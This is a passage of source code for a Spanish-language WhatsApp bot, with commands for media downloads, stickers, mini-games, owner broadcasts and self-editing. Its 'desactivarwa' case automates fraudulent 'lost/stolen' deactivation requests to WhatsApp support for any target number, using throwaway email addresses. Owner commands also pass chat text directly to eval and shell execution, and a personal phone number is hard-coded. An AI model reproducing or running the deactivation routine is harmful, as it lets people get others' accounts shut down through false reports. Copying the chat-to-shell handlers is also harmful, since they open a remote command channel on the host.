conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')
try {
const human = await fetch(`https://api.lolhuman.xyz/api/instagram?apikey=${lolkeysapi}&url=${args[0]}`);
const json = await human.json();
const videoig = json.result;
const shortUrl1 = await (await fetch(`https://tinyurl.com/api-create.php?url=${args[0]}`)).text();
conn.sendMessage(m.chat, {video: {url: videoig}, caption: `🔗 *Url:* ${shortUrl1}`}, {quoted: m})
} catch {
reply(info.error)}            
//rpg
case 'reg': {
await reg(conn, m, sender, text, fkontak)}
break            
case 'afk': {
await afk(conn, m, args, sender, pushname)}
break             
case 'buy': case 'buyall': {
await buy(conn, m, sender, args, command, text, fkontak)}
break
case 'minar': case 'mine':
await mine(conn, m, sender, fkontak)
break 
case 'trabajar': case 'work': {
await work(conn, m, sender, fkontak)}
break
case 'rob': case 'robar': { 
await rob(conn, m, sender, fkontak)}
break
case 'bal': case 'balance': case 'diamond': {
await bal(conn, m, sender, fkontak)}
break
case 'claim': case 'daily': 
await claim(conn, m, sender)
break
case 'perfil':
await perfil(conn, who, sender, pushname, fkontak, m) 
break
case 'levelup': case 'nivel': {  
nivel(conn, sender, canLevelUp, xpRange, m, pushname)}
break  
case 'cofre':
cofre(conn, sender, m) 
break 
case 'lb': case 'leaderboard':
lb(conn, participants, args, m) 
break
//stickers
case 's': case 'sticker': {  
if (global.db.data.users[m.sender].registered < true) return reply(info.registra)
if (/image/.test(mime)) {  
conn.fakeReply(m.chat, `⏳ *Aguarde un momento estoy creando tu stickers....*`, '0@s.whatsapp.net', 'No haga spam')
media = await quoted.download()  
let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })  
await fs.unlinkSync(encmedia)  
} else if (/video/.test(mime)) {  
if ((quoted.msg || quoted).seconds > 20) return reply('¡Máximo 20 segundos!')  
media = await quoted.download()  
let encmedia = await conn.sendVideoAsSticker(from, media, m, { packname: global.author, author: global.packname })  
await new Promise((resolve) => setTimeout(resolve, 2000));   
await fs.unlinkSync(encmedia)  
} else {  
reply(`*Y LA IMAGEN?*`)}}  
break; 
case 'wm': case 'take': {
if (global.db.data.users[m.sender].registered < true) return reply(info.registra)
if (!args.join(" ")) return reply(`*Responda un sticker para robar*`)
conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
conn.downloadAndSaveMediaMessage(quoted, "gifee")
conn.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
reply(`Y la imagen?`)}}
break 
case 'attp': {
if (global.db.data.users[m.sender].registered < true) return reply(info.registra)
if (!text) return reply('ingresa algo para convertirlo a sticker :v')
let link = `https://api.lolhuman.xyz/api/attp?apikey=${lolkeysapi}&text=${text}`
await conn.sendMessage(m.chat, { sticker: { url: link } }, { quoted: fkontak})}
break
case 'dado': 
let dir = `https://api.lolhuman.xyz/api/sticker/dadu?apikey=${lolkeysapi}`
conn.sendMessage(m.chat, { sticker: { url: dir } }, { quoted: fkontak})
break
//owner
case 'public': case 'publico': {
if (!isCreator) return reply(info.owner)
conn.public = true
reply('✅Cambio con exitoso a uso público')}
break
case 'self': case 'privado': {
if (!isCreator) return reply(info.owner)
conn.public = false
reply('✅Cambio con exitoso a uso privado')}
break	
case 'autoadmin': case 'tenerpoder': {
if (!m.isGroup) return reply(info.group)
if (!isCreator) return reply(info.owner)
m.reply('Ya eres admin mi jefe 😎') 
await conn.groupParticipantsUpdate(m.chat, [m.sender], "promote")}
break 
case 'leave': {
if (!isCreator) return reply(info.owner)
reply(m.chat, `*Adios fue un gusto esta aqui hasta pronto 👋*`)
await conn.groupLeave(m.chat)}
break
case 'bcgc': case 'bcgroup': {
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });   
if (!text) return conn.sendMessage(from, { text: `*Ingrese el texto que quiere difundir*` }, { quoted: msg }); 
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`*Enviando mensajes oficial un momento*`)
for (let i of anu) {
await sleep(1500)
let txt = `「 COMUNICADO 」\n\n${text}`
conn.sendText(i, txt, fkontak)}
reply(`ᴛʀᴀɴsᴍɪsɪᴏɴ ʀᴇᴀʟɪᴢᴀᴅᴀ ᴄᴏɴ ᴇxɪᴛᴏs ✅ ᴛᴏᴛᴀʟ ${anu.length} ᴄʜᴀᴛ ɢʀᴜᴘᴏs\nᴛɪᴇᴍᴘᴏ ᴛᴏᴛᴀʟ ᴅᴇ ᴇɴᴠɪᴏ: ${anu.length * 1.5} sᴇɢ`)}
break
case 'bc': case 'broadcast': case 'bcall': {
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });   
if (!text) return conn.sendMessage(from, { text: `*Ingrese el texto*` }, { quoted: msg }); 
let anu = await store.chats.all().map(v => v.id)
reply(`ᴛʀᴀɴsᴍɪsɪᴏɴ ʀᴇᴀʟɪᴢᴀᴅᴀ ᴄᴏɴ ᴇxɪᴛᴏs ✅ ᴛᴏᴛᴀʟ ${anu.length} ᴄʜᴀᴛs`)
for (let yoi of anu) {
await sleep(1500)
conn.sendText(yoi, txt, fkontak)}
reply('Listo')}
break
case 'block': case 'bloquear': {
if (!isCreator) return reply(info.owner)
reply(`*El usuario fue bloqueado del bot*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'block')}
break
case 'unblock': case 'desbloquear': {
if (!isCreator) return reply(info.owner)
reply(`*El usuario fue desbloqueado*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock')}
break            
case 'setcmd':  case 'addcmd':
if (!isCreator) return conn.adReply(m.chat, info.owner, m, false)
if (!m.quoted) return conn.adReply(m.chat, `*[ ⚠️ ] 𝚁𝙴𝚂𝙿𝙾𝙽𝙳𝙴 𝙰𝙻 𝚂𝚃𝙸𝙲𝙺𝙴𝚁 𝙾 𝙸𝙼𝙰𝙶𝙴𝙽 𝙰𝙻 𝙲𝚄𝙰𝙻 𝙳𝙴𝚂𝙴𝙰 𝙰𝙶𝚁𝙴𝙶𝙰𝚁 𝚄𝙽 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙾 𝚃𝙴𝚇𝚃𝙾*`, m, false)
if (!m.quoted.fileSha256) throw '*[ ⚠️ ] 𝚂𝙾𝙻𝙾 𝙿𝚄𝙴𝙳𝙴𝚂 𝙰𝚂𝙸𝙶𝙰𝙽𝙰𝚁 𝙲𝙾𝙼𝙰𝙽𝙳𝙾𝚂 𝙾 𝚃𝙴𝚇𝚃𝙾𝚂 𝙰 𝚂𝚃𝙸𝙲𝙺𝙴𝚁𝚂 𝙴 𝙸𝙼𝙰𝙶𝙴𝙽𝙴𝚂*'
if (!text) throw `*[ ⚠️ ] 𝙴𝚁𝚁𝙾𝚁 𝙳𝙴 𝚄𝚂𝙾, 𝚃𝙴𝚇𝚃𝙾 𝙵𝙰𝙻𝚃𝙰𝙽𝚃𝙴*\n\n*𝙴𝙹𝙴𝙼𝙿𝙻𝙾 𝙳𝙴 𝚄𝚂𝙾 𝙲𝙾𝚁𝚁𝙴𝙲𝚃𝙾 𝙳𝙴𝙻 𝙲𝙾𝙼𝙰𝙽𝙳𝙾:*\n*${usedPrefix + command} <#menu> <responder a sticker o imagen>*`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {text, mentionedJid: m.mentionedJid, creator: m.sender, at: + new Date, locked: false, }
m.reply(`*[ ✔ ] ᴇʟ ᴛᴇxᴛᴏ/ᴄᴏᴍᴀɴᴅᴏ ᴀsɪɢɴᴀᴅᴏ ᴀʟ sᴛɪᴄᴋᴇʀ/ɪᴍᴀɢᴇɴ ғᴜᴇ ᴀɢʀᴇɢᴀᴅᴏ ᴀ ʟᴀ ʙᴀsᴇ ᴅᴇ ᴅᴀᴛᴏs ᴄᴏʀʀᴇᴄᴛᴀᴍᴇɴᴛᴇ*`)
break
            case 'delcmd': 
                let _sh = m.quoted.fileSha256.toString('base64')
                if (!_sh) throw '*El sticker no tiene un comando asignado!!*'
                if (global.db.data.sticker[_sh] && global.db.data.sticker[_sh].locked) throw '*❌ No tienes permiso de eliminar este comando*'        
                delete global.db.data.sticker[_sh]
                m.reply('*✅ Hecho*')
            break
            case 'listcmd': 
                let _teks = `*Lista de comandos*\n*⚠️ Info los stickers con bold estan bloqueados!!*\n${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}`.trim()
                conn.sendText(m.chat, _teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            break
case 'addcase':
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg }); 
if (!text) throw 'envia el case'
try {
const addcase =[fs.readFileSync('main.js', 'utf8').slice(0, fs.readFileSync('main.js', 'utf8').lastIndexOf('break') + 5), q, fs.readFileSync('main.js', 'utf8').slice(fs.readFileSync('main.js', 'utf8').lastIndexOf('break') + 5)].join('\n');
fs.writeFileSync('main.js', addcase)
conn.editMessage(m.chat, '*aguarde estoy agregado el case*', '*Listo!!*', 5, m)
} catch (error) {
throw error
}
break	    
case 'getcase': 
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg }); 
if (!text) return m.reply(`Que comando a buscar o que?`) 
try { 
bbreak = 'break' 
reply('case ' + `${args[0]}` + fs.readFileSync('./main.js').toString().split(`case '${args[0]}`)[1].split(bbreak)[0] + bbreak) 
} catch (err) { 
console.error(err) 
reply("Error, tal vez no existe el comando")} 
break
case 'update': 
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });    
try {    
let stdout = execSync('git pull' + (m.fromMe && q ? ' ' + q : ''))
await conn.sendMessage(from, { text: stdout.toString() }, { quoted: msg });
} catch { 
let updatee = execSync('git remote set-url origin https://github.com/elrebelde21/NovaBot-MD.git && git pull')
await conn.sendMessage(from, { text: updatee.toString() }, { quoted: msg })}  
break

case "desactivarwa": {
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg }); 
if (Input) {
let cekno = await conn.onWhatsApp(Input)
if (cekno.length == 0) return reply(`El participante ya no está registrado en WhatsApp`)
if (Input == owner + "@s.whatsapp.net") return reply(`Solo para mi jefe`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({url, method: "POST", data: form, headers: {cookie}})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`*Listo..!*`)
} else if (payload.includes(`"payload":false`)) {
reply(`Ufff limit`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('*⚠️Ingresa el numero*')}
break

//función pickrandow
function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
 
default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
return reply(JSON.stringify(eval(budy.slice(2)), null, '\t'))
} catch (e) {
e = String(e)
reply(e)
}}
if (budy.startsWith('=>')) {
if (!isCreator) return
try {
return  reply(JSON.stringify(eval(`(async () => { ${budy.slice(3)} })()`), null, '\t'))  //gata.sendMessage(from, JSON.stringify(eval(`(async () => { ${budy.slice(3)} })()`), null, '\t'), text, { quoted: msg })
} catch (e) {
e = String(e)
reply(e)
}}
if (budy.startsWith('$')) {
if (!isCreator) return
try {
return reply(String(execSync(budy.slice(2), { encoding: 'utf-8' })))
} catch (err) {
console.log(util.format(err))
let e = String(err) 
conn.sendMessage("595975740803@s.whatsapp.net", { text: "Hola Creador/desarrollador, parece haber un error, por favor arreglarlo 🥲" + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})}}}}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
